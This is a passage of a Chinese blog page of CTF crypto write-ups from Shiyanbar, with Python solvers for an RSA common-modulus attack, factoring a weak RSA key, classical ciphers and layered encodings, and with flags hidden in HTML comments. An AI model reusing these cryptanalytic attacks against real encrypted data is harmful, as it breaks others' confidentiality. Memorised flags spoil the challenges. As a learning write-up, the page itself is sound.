class="number">16</span>)) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a,b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'problem.txt'</span>)</span><br><span class="line">txt = f.read().splitlines()</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># print(txt)</span></span><br><span class="line">List = &#123;&#125;</span><br><span class="line">e = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(txt)):</span><br><span class="line">    a = re.findall(<span class="string">'729743L : (.*) : 0x'</span>,txt[i])</span><br><span class="line">    b = re.findall(<span class="string">'%s : (.*)L&#125;'</span>%a[<span class="number">0</span>],txt[i])</span><br><span class="line">    e.append(a[<span class="number">0</span>])</span><br><span class="line">    List[a[<span class="number">0</span>]]=b[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = PanDuan()</span><br><span class="line">print(<span class="string">'e1=%d'</span>%int(a[<span class="number">0</span>],<span class="number">16</span>))</span><br><span class="line">print(<span class="string">'e2=%d'</span>%int(a[<span class="number">1</span>],<span class="number">16</span>))</span><br><span class="line">print(<span class="string">'message1=%d'</span>%int(List[a[<span class="number">0</span>]],<span class="number">16</span>))</span><br><span class="line">print(<span class="string">'message2=%d'</span>%int(List[a[<span class="number">1</span>]],<span class="number">16</span>))</span><br></pre></td></tr></table></figure><p>判断出两组互为素数的e后，即可进行共模攻击得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii</span><br><span class="line"></span><br><span class="line">e1=<span class="number">1804229351</span></span><br><span class="line">e2=<span class="number">17249876309</span></span><br><span class="line">message1=<span class="number">78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853</span></span><br><span class="line">message2=<span class="number">98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201</span></span><br><span class="line">n = <span class="string">'0xa5f7f8aaa82921f70aad9ece4eb77b62112f51ac2be75910b3137a28d22d7ef3be3d734dabb9d853221f1a17b1afb956a50236a7e858569cdfec3edf350e1f88ad13c1efdd1e98b151ce2a207e5d8b6ab31c2b66e6114b1d5384c5fa0aad92cc079965d4127339847477877d0a057335e2a761562d2d56f1bebb21374b729743'</span></span><br><span class="line">n = int(n,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s &amp; t</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    message1 = gmpy2.invert(message1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    message2 = gmpy2.invert(message2, n)</span><br><span class="line">plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n</span><br><span class="line">print(plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10进制转16进制再转ASCII</span></span><br><span class="line">flag = str(binascii.a2b_hex(hex(plain)[<span class="number">2</span>:]),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><!--flag_Strength_Lies_In_Differences--><h1 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h1><p>16进制转ASCII-&gt;URL解码-&gt;base64解码-&gt;10进制转ASCII<br><!--ctf{welcometoshiyanbar}--></p><h1 id="RSA实践"><a href="#RSA实践" class="headerlink" title="RSA实践"></a>RSA实践</h1><p>由于gmpy2模块还没用支持py3.6，所以我用py2写的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">p=473398607161</span><br><span class="line">q=4511491</span><br><span class="line">e=17</span><br><span class="line">print gmpy2.invert(e,(p-1)*(q-1))</span><br></pre></td></tr></table></figure></p><!--125631357777427553--><h1 id="杯酒人生"><a href="#杯酒人生" class="headerlink" title="杯酒人生"></a>杯酒人生</h1><p>先将加密的密钥<code>HTRUZYJW</code>进行凯撒解密得到秘钥<code>COMPUTER</code><br>再将密文<code>BLOCKCIPHERDESIGNPRINCIPLE</code>进行维吉尼亚密码加密得到flag，注意格式大写<br>加密网址：<a href="http://ctf.ssleye.com/vigenere.html" target="_blank" rel="noopener">http://ctf.ssleye.com/vigenere.html</a><br><!--DZAREVMGJSDSYLMXPDDXHVMGNS--></p><h1 id="一串奇怪的数"><a href="#一串奇怪的数" class="headerlink" title="一串奇怪的数"></a>一串奇怪的数</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evalCrossTotal</span><span class="params">(strMd5)</span>:</span></span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strMd5:</span><br><span class="line">        r += int(<span class="string">"0x%s"</span> % i, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryptString</span><span class="params">(strString, strPasswd)</span>:</span></span><br><span class="line">    strPasswdMd5 = md5(strPasswd)</span><br><span class="line">    intMd5 = evalCrossTotal(strPasswdMd5)</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(strString)):</span><br><span class="line">        r.append(ord(strString[i]) + int(<span class="string">"0x%s"</span> % strPasswdMd5[i%<span class="number">32</span>], <span class="number">16</span>) - intMd5)</span><br><span class="line">        intMd5 = evalCrossTotal(md5(strString[:(i+<span class="number">1</span>)])[:<span class="number">16</span>] + md5(str(intMd5))[:<span class="number">16</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">" "</span>.join(map(<span class="keyword">lambda</span> x: str(x), r))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptString</span><span class="params">(nList, strPasswd)</span>:</span></span><br><span class="line">    strPasswdMd5 = md5(strPasswd)</span><br><span class="line">    intMd5 = evalCrossTotal(strPasswdMd5)</span><br><span class="line">    r = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nList)):</span><br><span class="line">        r += chr(nList[i] - int(<span class="string">"0x%s"</span> % strPasswdMd5[i % <span class="number">32</span>], <span class="number">16</span>) + intMd5)</span><br><span class="line">        intMd5 = evalCrossTotal(md5(r[:(i + <span class="number">1</span>)])[:<span class="number">16</span>] + md5(str(intMd5))[:<span class="number">16</span>])</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = <span class="string">"-149 -234 -157 -132 -187 -140 -157 -241 -158 -177 -85 -215 -180 -187 -173 -218 -161 -183 -133 -226 -136 -171 -126 -169 -155 -96 -169 -240 -163 -153 -137 -111 -123 -191 -151 -213 -151 -142 -152 -208 -118 -137 -136 -244 -157 -168 -187 -201 -170 -176 -192 -209 -205 -174 -163 -189 -126 -133 -148 -194 -145 -212 -170 -155 -148 -165 -167 -206 -171 -177 -88 -173 -125 -129 -129 -235 -121 -190 -161 -165"</span></span><br><span class="line">    nList = eval(<span class="string">'[%s]'</span> % s.replace(<span class="string">' '</span>, <span class="string">','</span>))</span><br><span class="line">    strPasswd = <span class="string">''</span></span><br><span class="line">    print(decryptString(nList, strPasswd))</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><!--SEC-URI-KEY-TYB-HAH--><h1 id="凯撒和某某加密"><a href="#凯撒和某某加密" class="headerlink" title="凯撒和某某加密"></a>凯撒和某某加密</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Crypto =<span class="string">'aZZg/x\ZbavpZiEZp+n)o+'</span></span><br><span class="line">list1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Crypto:</span><br><span class="line">    num = ord(i) + <span class="number">5</span> <span class="comment">#多次尝试发现增加5得到类似flag的值</span></span><br><span class="line">    list1 += chr(num)</span><br><span class="line"></span><br><span class="line">print(list1)</span><br><span class="line"><span class="comment"># f__l4&#125;a_gf&#123;u_nJ_u0s.t0</span></span><br><span class="line"><span class="comment"># 输出看到位置不对，根据flag，所以应该是三个一组的栅栏</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">根据flag猜测是栅栏</span><br><span class="line">f__</span><br><span class="line">l4&#125;</span><br><span class="line">a_</span><br><span class="line">gf</span><br><span class="line">&#123;u</span><br><span class="line">_n</span><br><span class="line">J_</span><br><span class="line">u0</span><br><span class="line">s.</span><br><span class="line">t0</span><br><span class="line">前两行三个字符，后面是两个字符。真坑</span><br></pre></td></tr></table></figure><!--flag{_Just_4_fun_0.0_}--><h1 id="他的情书"><a href="#他的情书" class="headerlink" title="他的情书"></a>他的情书</h1><p>打开链接什么鬼，直接view-source查看源代码，查看jsfuck得到提示<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/04-01.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/04-02.png" alt="" title="" class="">                <p></p>            </figure><br>unescape解码后js再次解密得到js代码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/04-03.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zhegejiamiyidiandoubuku</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> pass = <span class="built_in">document</span>.form.passwd.value;</span><br><span class="line"><span class="keyword">var</span> cry = <span class="string">"Rm9yM0re354v5E4FUg5FasDboooo=="</span>;</span><br><span class="line"><span class="keyword">var</span> addr = <span class="string">'soroki.php?passwd='</span>;</span><br><span class="line"><span class="keyword">var</span> locatie = location.href;</span><br><span class="line"><span class="keyword">var</span> out = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">var</span> pass2 = cry.substring(<span class="number">15</span>, <span class="number">4</span> * <span class="number">4</span>) + cry.substring(<span class="number">24</span>, <span class="number">5</span> * <span class="number">5</span>) + cry.substring(<span class="number">0</span>, <span class="number">1</span>) + cry.substr(<span class="number">7</span>, <span class="number">1</span>) + cry.substr(<span class="number">11</span>, <span class="number">1</span>) + cry.substr(<span class="number">13</span>, <span class="number">1</span>) + cry.substring(<span class="number">3</span> + <span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line">pass = locatie.substr(locatie.indexOf(<span class="string">'?'</span>) + <span class="number">1</span>);</span><br><span class="line">addr = addr.substring(<span class="number">0</span>, addr.indexOf(<span class="string">'?'</span>) + <span class="number">1</span>) + <span class="string">'l0vau='</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pass.Len; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (pass.charAt(i) == pass2.charAt(i)) &#123;</span><br><span class="line"><span class="built_in">document</span>.write(pass.charAt(i))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">location = addr + pass</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>分析后访问url/soroki.php?l0vau=FoRevEr得到base64值，解码后得到：zqc{fkqtl_fp_yfd_py}<br>尝试凯撒移位得到flag，格式ctf{}<br><!--ctf{intwo_is_big_sb}--></p><h1 id="RSANG-Asis-CTF-2013"><a href="#RSANG-Asis-CTF-2013" class="headerlink" title="RSANG(Asis CTF 2013)"></a>RSANG(Asis CTF 2013)</h1><p>不会<br>参考1：<a href="https://blog.csdn.net/dongyanwen6036/article/details/77131442" target="_blank" rel="noopener">Asis CTF 2013: “RSAng”</a><br>参考2：<a href="http://hebin.me/2017/09/07/%E8%A5%BF%E6%99%AEctf-rsangasis-ctf-2013/" target="_blank" rel="noopener">西普CTF-RSANG(Asis CTF 2013)</a><br><!--CTF_13f1c2154d59e27b5405bc859149b970--></p><h1 id="唯密文攻击"><a href="#唯密文攻击" class="headerlink" title="唯密文攻击"></a>唯密文攻击</h1><p>解题思路：<a href="https://blog.csdn.net/dongyanwen6036/article/details/76767506" target="_blank" rel="noopener">唯密文攻击–实验吧详细解</a><br><!--CTF{USTC-F49D7F}--></p><h1 id="base"><a href="#base" class="headerlink" title="base??"></a>base??</h1><p>所有字母都变成大写的，需要循环大小写，base64解码后校验哈希值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">List = product([<span class="string">'Y'</span>,<span class="string">'y'</span>],[<span class="string">'M'</span>,<span class="string">'m'</span>],[<span class="string">'F'</span>,<span class="string">'f'</span>],[<span class="string">'Z'</span>,<span class="string">'z'</span>],[<span class="string">'Z'</span>,<span class="string">'z'</span>],[<span class="string">'T'</span>,<span class="string">'t'</span>],[<span class="string">'Y'</span>,<span class="string">'y'</span>],[<span class="string">'0'</span>],[<span class="string">'D'</span>,<span class="string">'d'</span>],[<span class="string">'3'</span>],[<span class="string">'R'</span>,<span class="string">'r'</span>],[<span class="string">'M'</span>,<span class="string">'m'</span>],[<span class="string">'D'</span>,<span class="string">'d'</span>],[<span class="string">'3'</span>],[<span class="string">'R'</span>,<span class="string">'r'</span>],[<span class="string">'M'</span>,<span class="string">'m'</span>],[<span class="string">'M'</span>,<span class="string">'m'</span>],[<span class="string">'T'</span>,<span class="string">'t'</span>],[<span class="string">'I'</span>,<span class="string">'i'</span>],[<span class="string">'Z'</span>,<span class="string">'z'</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> List:</span><br><span class="line">    Str = <span class="string">''</span>.join(i)</span><br><span class="line">    <span class="comment"># print(Str)</span></span><br><span class="line">    Md5 = md5(b64decode(Str)).hexdigest() <span class="comment">#计算哈希</span></span><br><span class="line">    <span class="keyword">if</span> Md5 == <span class="string">'16478a151bdd41335dcd69b270f6b985'</span>: <span class="comment">#对比</span></span><br><span class="line">        print(<span class="string">'flag:'</span> + str(b64decode(Str),encoding=<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p><h2 id="非常规解"><a href="#非常规解" class="headerlink" title="非常规解"></a>非常规解</h2><p>链接：<a href="https://somd5.com/" target="_blank" rel="noopener">https://somd5.com/</a><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/20-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--base64wtfwtf123--></p><h1 id="js"><a href="#js" class="headerlink" title="js"></a>js</h1><p>js解密-&gt;unicode转中文后得到flag<br>这里需要注意打开题目链接后复制源代码内的内容，而不是网页内的内容（坑死我了.jpg）<br><!--SimCTF{js_encode}--></p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>参考：<a href="http://hebin.me/2017/09/07/%E8%A5%BF%E6%99%AEctf-rsa/" target="_blank" rel="noopener">http://hebin.me/2017/09/07/%E8%A5%BF%E6%99%AEctf-rsa/</a><br>python2脚本，先提取出n和e<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">pub = RSA.importKey(open(<span class="string">'public.pem'</span>).read())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"><span class="comment"># n = 74207624142945242263057035287110983967646020057307828709587969646701361764263</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br></pre></td></tr></table></figure></p><p>分解n，得到pq：<a href="http://www.factordb.com/index.php" target="_blank" rel="noopener">http://www.factordb.com/index.php</a><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/07-01.png" alt="" title="" class="">                <p></p>            </figure><br>生成私钥<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">keypair.p = <span class="number">258631601377848992211685134376492365269</span></span><br><span class="line">keypair.q = <span class="number">286924040788547268861394901519826758027</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></p><p>使用openssl解密文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure></p><!--ISG{256bit_is_weak}--><h1 id="NSCTF-crypto200"><a href="#NSCTF-crypto200" class="headerlink" title="NSCTF crypto200"></a>NSCTF crypto200</h1><p>stegsolve打开，找到二维码，再用QR Research解开二维码得到flag<br><!--flag{NSCTF_Qr_C0De}--></p><h1 id="NSCTF-crypto50"><a href="#NSCTF-crypto50" class="headerlink" title="NSCTF crypto50"></a>NSCTF crypto50</h1><p>AES解密-&gt;凯撒解密<br>AES：<a href="https://www.sojson.com/encrypt_aes.html" target="_blank" rel="noopener">https://www.sojson.com/encrypt_aes.html</a><br><!--flag{NSCTF_Rot_EnCryption}--></p><h1 id="黑客叔叔（雨袭团）内部交流题（第一季1-0-2）"><a href="#黑客叔叔（雨袭团）内部交流题（第一季1-0-2）" class="headerlink" title="黑客叔叔（雨袭团）内部交流题（第一季1.0.2）"></a>黑客叔叔（雨袭团）内部交流题（第一季1.0.2）</h1><p>先将所有密文变成一行，将<code>等等</code>替换成<code>==</code>，其他中文替换成<code>/</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX18vmjE0tvWk69T/B/u9inuiNnM3rBhsu6tXzLhu+iofwuHNHq3YtDKs8ZlYLvSZuUY+mxLRKO7+m254R5YTCW8yzzgD+mGwWfGRgqmPKdD/xA==</span><br></pre></td></tr></table></figure></p><p>先<a href="https://www.sojson.com/encrypt_triple_des.html" target="_blank" rel="noopener">TripleDes解密</a>，然后<a href="https://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="noopener">Rabbit解密</a><br><!--RainRaid_Flag_Rabbit&TripleDes_Nice--></p><h1 id="黑客叔叔（雨袭团）内部交流题（第一季1-0-1）"><a href="#黑客叔叔（雨袭团）内部交流题（第一季1-0-1）" class="headerlink" title="黑客叔叔（雨袭团）内部交流题（第一季1.0.1）"></a>黑客叔叔（雨袭团）内部交流题（第一季1.0.1）</h1><p>先base64解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umfpbljhawrfrmxhz19zmf9megnrmw45x3donhq|01|03|07|+|+1|+3|+7|2+1|2+2|2+6|2+7|2+9|3+0|3+3|3+7|3+8|3+9|?|</span><br></pre></td></tr></table></figure></p><p>一脸懵比，其实后面<code>01</code>代表前面的字符串第一个变成大写,<code>+</code>代表10，<code>2+1</code>代表21<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UmFpblJhaWRfRmxhZ19zMF9meGNrMW45X3doNHQ</span><br></pre></td></tr></table></figure></p><p>最后加上<code>=</code>号得到flag<br><!--RainRaid_Flag_s0_fxck1n9_wh4t--></p><h1 id="simple-algorithm"><a href="#simple-algorithm" class="headerlink" title="simple algorithm"></a>simple algorithm</h1><p>刚开始写出与FAN对应的解密函数，但是发现字符长度不可控制，看了<a href="https://blog.csdn.net/dongyanwen6036/article/details/76560332" target="_blank" rel="noopener">别人的writeup</a>，发现n值有限定范围：0~99，于是生成字典得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FAN</span><span class="params">(n, m)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    z = []</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            z.append(<span class="number">2</span> - (n % <span class="number">4</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            z.append(<span class="number">0</span>)</span><br><span class="line">        n = (n - z[i])/<span class="number">2</span></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">    z = z[::<span class="number">-1</span>]</span><br><span class="line">    l = len(z)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, l):</span><br><span class="line">        s += z[i] * m ** (l - <span class="number">1</span> - i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">deFAN = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    a = FAN(i,<span class="number">3</span>)</span><br><span class="line">    deFAN[a]=i</span><br><span class="line"><span class="comment"># print deFAN</span></span><br><span class="line">r = <span class="string">'2712733801194381163880124319146586498182192151917719248224681364019142438188097307292437016388011943193619457377217328473027324319178428'</span></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line">str1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> b &lt; len(r):</span><br><span class="line">    <span class="keyword">if</span> int(r[b:b + <span class="number">4</span>]) <span class="keyword">in</span> deFAN:</span><br><span class="line">        str1 += <span class="string">'%d'</span> % (deFAN[int(r[b:b + <span class="number">4</span>])])</span><br><span class="line">        b += <span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> int(r[b:b + <span class="number">3</span>]) <span class="keyword">in</span> deFAN:</span><br><span class="line">        str1 += <span class="string">'%02d'</span> % (deFAN[int(r[b:b + <span class="number">3</span>])])</span><br><span class="line">        b += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> int(r[b:b + <span class="number">2</span>]) <span class="keyword">in</span> deFAN:</span><br><span class="line">        str1 += <span class="string">'%02d'</span> % (deFAN[int(r[b:b + <span class="number">2</span>])])</span><br><span class="line">        b += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> int(r[b:b + <span class="number">1</span>]) <span class="keyword">in</span> deFAN:</span><br><span class="line">        str1 += <span class="string">'%02d'</span> % (deFAN[int(r[b:b + <span class="number">1</span>])])</span><br><span class="line">        b += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">'%x'</span> % (int(str1))<span class="comment">#最后注意bytes与string的转换</span></span><br><span class="line">print(<span class="string">'结果为： '</span> + str2.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure></p><!--SIS{a9ab115c488a311896dac4e8bc20a6d7}--><h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>先提取n，e<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">pub = 